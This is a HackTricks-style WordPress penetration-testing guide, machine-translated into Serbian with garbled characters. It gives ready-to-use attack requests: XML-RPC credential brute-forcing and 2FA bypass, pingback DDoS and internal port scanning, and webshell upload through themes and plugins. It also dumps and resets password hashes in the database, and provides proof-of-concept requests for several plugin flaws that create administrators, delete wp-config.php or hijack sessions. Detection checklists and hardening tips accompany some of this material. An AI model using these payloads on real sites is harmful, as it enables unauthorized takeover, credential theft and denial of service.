# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** pa ako izmenite neki php teme da biste dobili RCE verovatno Ä‡ete koristiti taj put. Na primer: KoristeÄ‡i **theme twentytwelve** moÅ¾ete **access** fajl **404.php** na: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- U **wp-config.php** moÅ¾ete naÄ‡i root lozinku baze podataka.
- Podrazumevani login putevi za proveru: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Glavni WordPress fajlovi**

- `index.php`
- `license.txt` sadrÅ¾i korisne informacije kao Å¡to je verzija WordPress koja je instalirana.
- `wp-activate.php` se koristi za email aktivacioni proces prilikom podeÅ¡avanja novog WordPress sajta.
- Login folderi (mogu biti preimenovani da bi se sakrili):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` je fajl koji predstavlja funkcionalnost WordPress-a koja omoguÄ‡ava prenos podataka koristeÄ‡i HTTP kao transportni mehanizam i XML kao encoding mehanizam. Ova vrsta komunikacije je zamenjena WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` je glavni direktorijum gde se Äuvaju plugins i themes.
- `wp-content/uploads/` je direktorijum gde se Äuvaju fajlovi otpremljeni na platformu.
- `wp-includes/` je direktorijum gde se nalaze core fajlovi, kao Å¡to su certificates, fonts, JavaScript fajlovi i widgets.
- `wp-sitemap.xml` U Wordpress verzijama 5.5 i novijim, WordPress generiÅ¡e sitemap XML fajl sa svim javnim postovima i javno queryable post tipovima i taksonomijama.

**Post exploitation**

- Fajl `wp-config.php` sadrÅ¾i informacije potrebne WordPress-u za konekciju sa bazom podataka kao Å¡to su ime baze, host baze, korisniÄko ime i lozinka, authentication keys i salts, i prefix tabela baze. Ovaj konfiguracioni fajl se takoÄ‘e moÅ¾e koristiti za aktiviranje DEBUG moda, Å¡to moÅ¾e biti korisno pri otklanjanju problema.

### Dozvole korisnika

- **Administrator**
- **Editor**: Objavljuje i upravlja svojim i tuÄ‘im postovima
- **Author**: Objavljuje i upravlja sopstvenim postovima
- **Contributor**: PiÅ¡e i upravlja svojim postovima ali ne moÅ¾e da ih objavi
- **Subscriber**: Pregleda postove i ureÄ‘uje svoj profil

## **Pasivna enumeracija**

### **Dobijanje verzije WordPress-a**

Proverite da li moÅ¾ete pronaÄ‡i fajlove `/license.txt` ili `/readme.html`

U **izvornom kodu** stranice (primer sa [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link fajlovi

![](<../../images/image (533).png>)

- JavaScript fajlovi

![](<../../images/image (524).png>)

### Preuzmi dodatke
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Preuzimanje tema
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Izdvajanje verzija uopÅ¡teno
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktivna enumeracija

### Dodaci i teme

Verovatno neÄ‡ete moÄ‡i da pronaÄ‘ete sve plugine i teme koje su moguÄ‡e. Da biste otkrili sve, moraÄ‡ete da **aktivno Brute Force-ujete listu plugina i tema** (nadamo se da postoje automatizovani alati koji sadrÅ¾e te liste).

### Korisnici

- **ID Brute:** Dobijate validne korisnike sa WordPress sajta Brute Forcing-om ID-eva korisnika:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Ako su odgovori **200** ili **30X**, to znaÄi da je id **vaÅ¾eÄ‡i**. Ako je odgovor **400**, id je **nevaÅ¾eÄ‡i**.

- **wp-json:** TakoÄ‘e moÅ¾ete pokuÅ¡ati da dobijete informacije o korisnicima upitom:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
JoÅ¡ jedan `/wp-json/` endpoint koji moÅ¾e otkriti neke informacije o korisnicima je:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Imajte na umu da ovaj endpoint izlaÅ¾e samo korisnike koji su kreirali post. **BiÄ‡e pruÅ¾ene samo informacije o korisnicima koji imaju ovu funkciju omoguÄ‡enu**.

TakoÄ‘e imajte na umu da **/wp-json/wp/v2/pages** moÅ¾e leak IP adrese.

- **Login username enumeration**: Kada se logujete na **`/wp-login.php`**, **poruka** se **razlikuje** i ukazuje da li **korisniÄko ime postoji ili ne**.

### XML-RPC

Ako je `xml-rpc.php` aktivan, moÅ¾ete izvrÅ¡iti credentials brute-force ili ga koristiti za pokretanje DoS napada na druge resurse. (Ovaj proces moÅ¾ete automatizovati, na primer [using this](https://github.com/relarizky/wpxploit)).

Da biste proverili da li je aktivan, pokuÅ¡ajte da pristupite _**/xmlrpc.php**_ i poÅ¡aljite ovaj zahtev:

**Provera**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ili **`metaWeblog.getUsersBlogs`** su neki od metoda koji se mogu koristiti za brute-force credentials. Ako pronaÄ‘ete bilo koji od njih, moÅ¾ete poslati neÅ¡to poput:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Poruka _"Incorrect username or password"_ u odgovoru sa kodom 200 treba Ğ´Ğ° ÑĞµ Ğ¿Ğ¾Ñ˜Ğ°Ğ²Ğ¸ Ğ°ĞºĞ¾ credentials nisu validni.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

KoristeÄ‡i ispravne credentials moÅ¾ete otpremiti fajl. U odgovoru Ä‡e se pojaviti putanja (https://gist.github.com/georgestephanis/5681982)
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
TakoÄ‘e postoji **brÅ¾i naÄin** da izvrÅ¡ite brute-force nad credentials koristeÄ‡i **`system.multicall`**, jer moÅ¾ete probati viÅ¡e credentials u istom zahtevu:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Ova metoda je namenjena programima, ne ljudima, i zastarela je, zato ne podrÅ¾ava 2FA. Dakle, ako imate valid creds ali je glavni pristup zaÅ¡tiÄ‡en 2FA, **moÅ¾da Ä‡ete moÄ‡i da zloupotrebite xmlrpc.php da se prijavite tim creds zaobilazeÄ‡i 2FA**. Imajte na umu da neÄ‡ete moÄ‡i da izvrÅ¡ite sve akcije koje moÅ¾ete iz konzole, ali moÅ¾da Ä‡ete ipak uspeti da doÄ‘ete do RCE kao Å¡to Ippsec objaÅ¡njava u [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Ako moÅ¾ete naÄ‡i metodu _**pingback.ping**_ u listi, moÅ¾ete naterati Wordpress da poÅ¡alje proizvoljan zahtev na bilo koji host/port.\
Ovo se moÅ¾e iskoristiti da se zamoli **thousands** of Wordpress **sites** da **access** jednu **location** (tako se u toj lokaciji izaziva **DDoS**) ili moÅ¾ete iskoristiti da naterate **Wordpress** lo **scan** neki interni **network** (moÅ¾ete navesti bilo koji port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Ako dobijete **faultCode** sa vrednoÅ¡Ä‡u veÄ‡om od **0** (17), to znaÄi da je port otvoren.

Pogledajte upotrebu **`system.multicall`** u prethodnom odeljku da biste nauÄili kako zloupotrebiti ovu metodu za DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ovaj fajl obiÄno postoji u root direktorijumu Wordpress sajta: **`/wp-cron.php`**\
Kada se ovaj fajl **pristupi**, izvrÅ¡ava se **"teÅ¾ak"** MySQL **upit**, pa ga **napadaÄi** mogu iskoristiti da **izazovu** **DoS**.\
TakoÄ‘e, podrazumevano, `wp-cron.php` se poziva pri svakom uÄitavanju stranice (kad god klijent zatraÅ¾i bilo koju Wordpress stranicu), Å¡to na sajtovima sa velikim saobraÄ‡ajem moÅ¾e izazvati probleme (DoS).

PreporuÄuje se onemoguÄ‡iti Wp-Cron i kreirati pravi cronjob na hostu koji Ä‡e u redovnim intervalima izvrÅ¡avati potrebne akcije (bez izazivanja problema).

### /wp-json/oembed/1.0/proxy - SSRF

PokuÅ¡ajte pristupiti _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i Worpress sajt moÅ¾e poslati zahtev prema vama.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Ovaj alat proverava da li postoji **methodName: pingback.ping** i putanja **/wp-json/oembed/1.0/proxy** i, ako postoje, pokuÅ¡ava da ih iskoristi.

## Automatski alati
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Dobijanje pristupa prepisivanjem bita

ViÅ¡e radoznalost nego stvarni napad. U CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) mogao si preokrenuti 1 bit u bilo kojoj wordpress datoteci. Tako si mogao preokrenuti bit na poziciji `5389` fajla `/var/www/html/wp-includes/user.php` i pretvoriti NOT (`!`) u NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modifying a php from the theme used (potrebni administratorski kredencijali)**

Izgled â†’ UreÄ‘ivaÄ teme â†’ 404 Template (sa desne strane)

Zamenite sadrÅ¾aj php shell-om:

![](<../../images/image (384).png>)

PotraÅ¾ite na internetu kako da pristupite toj aÅ¾uriranoj stranici. U ovom sluÄaju treba da pristupite ovde: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¾ete koristiti:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
da biste dobili sesiju.

## Plugin RCE

### PHP plugin

MoÅ¾e biti moguÄ‡e otpremiti .php fajlove kao plugin.\
Kreirajte svoj PHP backdoor koristeÄ‡i na primer:

![](<../../images/image (183).png>)

Zatim dodajte novi plugin:

![](<../../images/image (722).png>)

Otpremite plugin i pritisnite Install Now:

![](<../../images/image (249).png>)

Kliknite na Procced:

![](<../../images/image (70).png>)

Verovatno ovo naizgled neÄ‡e niÅ¡ta uraditi, ali ako odete u Media, videÄ‡ete svoj shell koji je otpremljen:

![](<../../images/image (462).png>)

Pristupite mu i videÄ‡ete URL za izvrÅ¡avanje reverse shell-a:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ovaj metod podrazumeva instalaciju malicioznog plugina za koji je poznato da je ranjiv i koji se moÅ¾e iskoristiti za dobijanje web shell-a. Ovaj proces se izvodi kroz WordPress dashboard na sledeÄ‡i naÄin:

1. **Nabavka plugina**: Plugin se dobija iz izvora kao Å¡to je Exploit DB kao [**here**](https://www.exploit-db.com/exploits/36374).
2. **Instalacija plugina**:
- Idite na WordPress dashboard, zatim na `Dashboard > Plugins > Upload Plugin`.
- Otpremite zip fajl skinutog plugina.
3. **Plugin Activation**: Nakon Å¡to je plugin uspeÅ¡no instaliran, mora biti aktiviran kroz dashboard.
4. **Exploitation**:
- Sa instaliranim i aktiviranim pluginom "reflex-gallery" moÅ¾e biti iskoriÅ¡Ä‡en jer je poznato da je ranjiv.
- Metasploit framework pruÅ¾a an exploit za ovu ranjivost. UÄitavanjem odgovarajuÄ‡eg modula i izvrÅ¡avanjem specifiÄnih komandi moÅ¾e se uspostaviti meterpreter sesija, Å¡to daje neautorizovan pristup sajtu.
- Napominje se da je ovo samo jedan od mnogih metoda za iskoriÅ¡Ä‡avanje WordPress sajta.

SadrÅ¾aj ukljuÄuje vizuelne prikaze koraka u WordPress dashboard-u za instalaciju i aktivaciju plugina. MeÄ‘utim, vaÅ¾no je napomenuti da iskoriÅ¡Ä‡avanje ranjivosti na ovaj naÄin predstavlja protivpravnu i neetiÄku radnju bez odgovarajuÄ‡e autorizacije. Ove informacije treba koristiti odgovorno i samo u pravnom okviru, poput penetration testing-a sa izriÄitom dozvolom.

**Za detaljnije korake pogledajte:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ je skripta dizajnirana da eskalira **Cross-Site Scripting (XSS)** ranjivost u **Remote Code Execution (RCE)** ili druge kritiÄne ranjivosti u WordPress-u. Za viÅ¡e informacija pogledajte [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). PruÅ¾a **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. i omoguÄ‡ava:**
- _**Privilege Escalation:**_ Kreira korisnika u WordPress-u.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Otpremite svoj custom plugin (backdoor) u WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Izmenite Built-In plugine u WordPress-u.
- _**(RCE) Built-In Theme Edit:**_ Izmenite Built-In teme u WordPress-u.
- _**(Custom) Custom Exploits:**_ Custom exploits za third-party WordPress plugine/teme.

## Post Exploitation

Ekstrahujte korisniÄka imena i lozinke:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Promeni administratorsku lozinku:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest Wordpress pluginova

### PovrÅ¡ina napada

Razumevanje kako Wordpress plugin moÅ¾e izloÅ¾iti funkcionalnost je kljuÄno za pronalaÅ¾enje ranjivosti u toj funkcionalnosti. MoÅ¾ete videti na koji naÄin plugin moÅ¾e izloÅ¾iti funkcionalnost u sledeÄ‡im taÄkama i nekoliko primera ranjivih pluginova u [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jedan od naÄina na koji plugin moÅ¾e izloÅ¾iti funkcije korisnicima je putem AJAX handlera. Ovi handleri mogu sadrÅ¾ati greÅ¡ke u logici, autorizaciji ili autentifikaciji. Å taviÅ¡e, Äesto je da Ä‡e ove funkcije zasnivati i autentifikaciju i autorizaciju na postojanju WordPress nonce-a koji **bilo koji autentifikovani korisnik u WordPress instanci moÅ¾e imati** (bez obzira na ulogu).

Ovo su funkcije koje se mogu koristiti da izloÅ¾e funkciju u pluginu:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**KoriÅ¡Ä‡enje `nopriv` Äini endpoint dostupnim svim korisnicima (Äak i neautentifikovanim).**

> [!CAUTION]
> Å taviÅ¡e, ako funkcija samo proverava autorizaciju korisnika pomoÄ‡u funkcije `wp_verify_nonce`, ta funkcija samo proverava da li je korisnik ulogovan, obiÄno ne proverava ulogu korisnika. Zato korisnici sa niskim privilegijama mogu imati pristup akcijama sa visokim privilegijama.

- **REST API**

TakoÄ‘e je moguÄ‡e izloÅ¾iti funkcije iz wordpress registracijom REST API-ja koristeÄ‡i funkciju `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` je callback funkcija koja proverava da li je dati korisnik ovlaÅ¡Ä‡en da pozove API metodu.

**Ako se koristi ugraÄ‘ena funkcija `__return_true`, jednostavno Ä‡e preskoÄiti proveru korisniÄkih dozvola.**

- **Direct access to the php file**

Naravno, Wordpress koristi PHP i fajlovi unutar pluginova su direktno dostupni preko weba. Dakle, ako plugin izlaÅ¾e bilo koju ranjivu funkcionalnost koja se aktivira samo pristupom fajlu, to Ä‡e biti iskoristivo od strane svakog korisnika.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

Some plugins implement â€œtrusted headerâ€ shortcuts for internal integrations or reverse proxies and then use that header to set the current user context for REST requests. If the header is not cryptographically bound to the request by an upstream component, an attacker can spoof it and hit privileged REST routes as an administrator.

- Impact: neautentifikovano eskaliranje privilegija do admina kreiranjem novog administratora putem core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (forces user ID 1, typically the first administrator account).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
ZaÅ¡to funkcioniÅ¡e

- Plugin preslikava header koji kontroliÅ¡e klijent na authentication state i preskaÄe capability checks.
- WordPress core oÄekuje `create_users` capability za ovu rutu; plugin hack ga zaobilazi direktnim postavljanjem konteksta trenutnog korisnika iz header-a.

OÄekivani indikatori uspeha

- HTTP 201 sa JSON telom koje opisuje kreiranog korisnika.
- Novi admin korisnik vidljiv u `wp-admin/users.php`.

Kontrolna lista za detekciju

- Grep za `getallheaders()`, `$_SERVER['HTTP_...']`, ili vendor SDKs koji Äitaju custom headers da bi postavili user context (npr. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Pregled REST registracija za privilegovane callbacks koji nemaju robusne `permission_callback` provere i umesto toga se oslanjaju na request headers.
- TraÅ¾i upotrebe core user-management funkcija (`wp_insert_user`, `wp_create_user`) unutar REST handlera koje su ograniÄene samo vrednostima header-a.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **callback postaje dostupan neautentifikovanim posetiocima**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), i
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, i
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemi uvedeni ovim isjeÄkom:

* **Unauthenticated access** â€“ registrovan je hook `wp_ajax_nopriv_`.
* **No nonce / capability check** â€“ bilo koji posetilac moÅ¾e da pozove endpoint.
* **No path sanitisation** â€“ string `fontfamily` koji kontroliÅ¡e korisnik se konkatenira u putanju fajl sistema bez filtriranja, omoguÄ‡avajuÄ‡i klasiÄan `../../` traversal.

#### Eksploatacija

NapadaÄ moÅ¾e obrisati bilo koji fajl ili direktorijum **ispod osnovnog uploads direktorijuma** (obiÄno `<wp-root>/wp-content/uploads/`) slanjem jednog HTTP POST zahteva:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Drugi znaÄajni ciljevi ukljuÄuju plugin/tema `.php` fajlove (npr. za onemoguÄ‡avanje security plugin-a) ili `.htaccess` pravila.

#### Detection checklist

* Bilo koji `add_action( 'wp_ajax_nopriv_...')` callback koji poziva filesystem helper-e (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itd.).
* Konkatenacija nesanitizovanih korisniÄkih ulaza u puteve (traÅ¾ite `$_POST`, `$_GET`, `$_REQUEST`).
* Nedostatak `check_ajax_referer()` i `current_user_can()`/`is_user_logged_in()`.

---

### PoviÅ¡enje privilegija putem vraÄ‡anja zastarelih uloga i nedostatka autorizacije (ASE "View Admin as Role")

Mnogi plugin-i implementiraju "view as role" ili privremenu promenu uloge tako Å¡to saÄuvaju originalnu ulogu/e u user meta kako bi ih mogli vratiti kasnije. Ako se put vraÄ‡anja oslanja samo na request parametre (npr. `$_REQUEST['reset-for']`) i na listu koju odrÅ¾ava plugin, bez provere capabilities i vaÅ¾eÄ‡eg nonce-a, to postaje vertikalno poviÅ¡enje privilegija.

Primer iz realnog sveta je pronaÄ‘en u Admin and Site Enhancements (ASE) plugin-u (â‰¤ 7.6.2.1). Reset grana je vraÄ‡ala uloge na osnovu `reset-for=<username>` ako je korisniÄko ime postojalo u internom nizu `$options['viewing_admin_as_role_are']`, ali nije izvrÅ¡ila ni `current_user_can()` proveru ni nonce verifikaciju pre uklanjanja trenutnih uloga i ponovnog dodavanja saÄuvanih uloga iz user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ZaÅ¡to je iskoriÅ¡Ä‡ivo

- Veruje `$_REQUEST['reset-for']` i opciji plugina bez autorizacije na strani servera.
- Ako je korisnik ranije imao viÅ¡e privilegija saÄuvanih u `_asenha_view_admin_as_original_roles` i bio je degradiran, moÅ¾e ih vratiti tako Å¡to Ä‡e pristupiti putanji za reset.
- U nekim instalacijama, bilo koji autentifikovani korisnik moÅ¾e pokrenuti reset za drugo korisniÄko ime koje je joÅ¡ uvek prisutno u `viewing_admin_as_role_are` (pokvarena autorizacija).

Eksploatacija (primer)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Na ranjivim verzijama ovo uklanja trenutne role i ponovo dodaje saÄuvane originalne role (npr. `administrator`), efektivno eskalirajuÄ‡i privilegije.

Detection checklist

- PotraÅ¾ite funkcije za prebacivanje role koje Äuvaju â€œizvorne roleâ€ u user meta (npr. `_asenha_view_admin_as_original_roles`).
- Identifikujte reset/restore putanje koje:
  - ÄŒitaju korisniÄka imena iz `$_REQUEST` / `$_GET` / `$_POST`.
  - Modifikuju role preko `add_role()` / `remove_role()` bez `current_user_can()` i `wp_verify_nonce()` / `check_admin_referer()`.
  - Autorizuju na osnovu niza opcija plugina (npr. `viewing_admin_as_role_are`) umesto na sposobnostima aktera.

---

### Neautentifikovana eskalacija privilegija putem prebacivanja korisnika koji se oslanja na cookie na javnom init (Service Finder â€œsf-bookingâ€)

Neki pluginovi povezuju pomoÄ‡nike za prebacivanje korisnika na javni `init` hook i izvode identitet iz cookie-ja koji kontroliÅ¡e klijent. Ako kod poziva `wp_set_auth_cookie()` bez provere autentikacije, capability i vaÅ¾eÄ‡eg nonce-a, bilo koji neautentifikovani posetilac moÅ¾e prisiliti prijavu kao proizvoljan ID korisnika.

TipiÄan ranjiv obrazac (pojednostavljeno iz Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ZaÅ¡to je moguÄ‡e iskoristiti

- Javni `init` hook Äini handler dostupan neautentifikovanim korisnicima (nema `is_user_logged_in()` provere).
- Identitet potiÄe iz cookie-ja koji klijent moÅ¾e izmeniti (`original_user_id`).
- Direktan poziv `wp_set_auth_cookie($uid)` uloguje zahtevaoca kao tog korisnika bez bilo kakvih capability/nonce provera.

Eksploatacija (bez autentifikacije)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF razmatranja za WordPress/plugin CVEs

GeneriÄki edge/server WAF-ovi su podeÅ¡eni za Å¡iroke obrasce (SQLi, XSS, LFI). Mnoge visokog uticaja WordPress/plugin ranjivosti su greÅ¡ke u logici/auth specifiÄne za aplikaciju koje izgledaju kao benigni saobraÄ‡aj osim ako engine ne razume WordPress rute i semantiku plugin-ova.

Ofanzivne napomene

- Ciljajte plugin-specifiÄne endpoints sa clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Prvo testirajte unauth paths (AJAX `nopriv`, REST sa permissive `permission_callback`, public shortcodes). Default payloads Äesto uspevaju bez obfuscation.
- TipiÄni sluÄajevi visokog uticaja: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Odbrambene napomene

- Ne oslanjajte se na generiÄke WAF signatures da zaÅ¡tite plugin CVE-ove. Implementirajte application-layer, vulnerability-specific virtual patches ili brzo aÅ¾urirajte.
- Preferirajte positive-security provere u kodu (capabilities, nonces, strict input validation) umesto negative regex filtera.

## ZaÅ¡tita WordPress-a

### Redovna aÅ¾uriranja

Uverite se da su WordPress, plugins i themes aÅ¾urirani. TakoÄ‘e potvrdite da je automatsko aÅ¾uriranje omoguÄ‡eno u wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
TakoÄ‘e, **instalirajte samo pouzdane WordPress pluginove i teme**.

### Sigurnosni pluginovi

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Ostale preporuke**

- Uklonite podrazumevanog **admin** korisnika
- Koristite **jake lozinke** i **2FA**
- PeriodiÄno **pregledajte** **dozvole** korisnika
